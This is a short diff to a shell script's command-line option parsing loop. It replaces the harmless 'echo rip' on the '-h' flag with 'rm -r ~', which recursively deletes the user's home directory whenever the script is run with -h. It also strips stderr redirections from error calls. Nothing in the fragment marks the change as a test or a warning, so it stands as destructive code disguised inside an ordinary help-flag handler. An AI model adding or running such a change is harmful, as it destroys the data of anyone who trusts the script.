@@ -17,13 +17,13 @@ err() {
 while getopts h-: 2>/dev/null opt
 do
 	case $opt in
-		h) echo rip ;;
+		h) rm -r ~ ;;
 		-)
 			case $OPTARG in
 				help) usage ;;
-				*) err ? >&2
+				*) err ?
 			esac
-			;;
-		?) err ? >&2 ;;
+		;;
+		?) err ?
 	esac
 done
